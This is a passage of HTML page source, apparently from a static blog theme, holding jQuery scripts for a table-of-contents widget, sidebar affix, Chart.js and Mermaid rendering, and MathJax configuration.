        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
        if (element) {
          $activeCur = element;
        } else {
          for (i = 0; i < headingsPos.length; i++) {
            if (scrollTop >= headingsPos[i]) {
              $activeCur = $tocLi.eq(i);
            } else {
              $activeCur || ($activeCur = $tocLi.eq(i));
              break;
            }
          }
        }
        $activeLast && $activeLast.removeClass('active');
        ($activeLast = $activeCur).addClass('active');
      }
      function render() {
        if(!hasRendered) {
          $root.append($tocUl);
          $headings.each(function() {
            var $this = $(this);
            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
          });
          $tocLi = $tocUl.children('li');
          $tocUl.on('click', 'a', function(e) {
            e.preventDefault();
            var $this = $(this);
            scrolling = true;
            setState($this.parent());
            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
              scrolling = false;
            });
          });
        }
        hasRendered = true;
      }
      function init() {
        var interval, timeout;
        if(!hasInit) {
          render(); calc(); setState(null, scrolling);
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState(null, scrolling);
          });
          $window.on('resize', window.throttle(function() {
            if (!disabled) {
              render(); calc(); setState(null, scrolling);
            }
          }, 100));
        }
        hasInit = true;
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions
      };
    }
    $.fn.toc = toc;
  });
})();
/*(function () {

})();*/
</script><script>
  /* toc must before affix, since affix need to konw toc' height. */(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window);
    var $articleContent = $('.js-article-content');
    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
    var toc;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;

    function disabled() {
      return $col2.css('display') === 'none' || !hasToc;
    }

    tocDisabled = disabled();

    toc = $tocRoot.toc({
      selectors: TOC_SELECTOR,
      container: $articleContent,
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      tocDisabled = disabled();
      toc && toc.setOptions({
        disabled: tocDisabled
      });
    }, 100));

  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window), $pageFooter = $('.js-page-footer');
    var $pageAside = $('.js-page-aside');
    var affix;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');

    affix = $pageAside.affix({
      offsetBottom: $pageFooter.outerHeight(),
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      scroll: hasSidebar ? $('.js-page-main').children() : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      affix && affix.setOptions({
        disabled: tocDisabled
      });
    }, 100));

    window.pageAsideAffix = affix;
  });
})();
</script><script>
  window.Lazyload.js(['/assets/js/jquery.min.js', '/assets/js/Chart.bundle.min.js'], function() {
    var $canvas = null, $this = null, _ctx = null, _text = '';
    $('.language-chart').each(function(){
      $this = $(this);
      $canvas = $('<canvas></canvas>');
      _text = $this.text();
      $this.text('').append($canvas);
      _ctx = $canvas.get(0).getContext('2d');
      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
    });
  });
</script>
<script type="text/x-mathjax-config">
	var _config = { tex2jax: {
		inlineMath: [['$','$'], ['\\(','\\)']]
	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
</script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  window.Lazyload.js('/assets/js/mermaid.min.js', function() {
    mermaid.initialize({
      startOnLoad: true
    });
    mermaid.init(undefined, '.language-mermaid');
  });
</script>

    </div>
    <script>(function () {
  var $root = document.getElementsByClassName('root')[0];
  if (window.hasEvent('touchstart')) {
    $root.dataset.isTouch = true;
    document.addEventListener('touchstart', function(){}, false);
  }
})();
</script>
  </body>
</html>

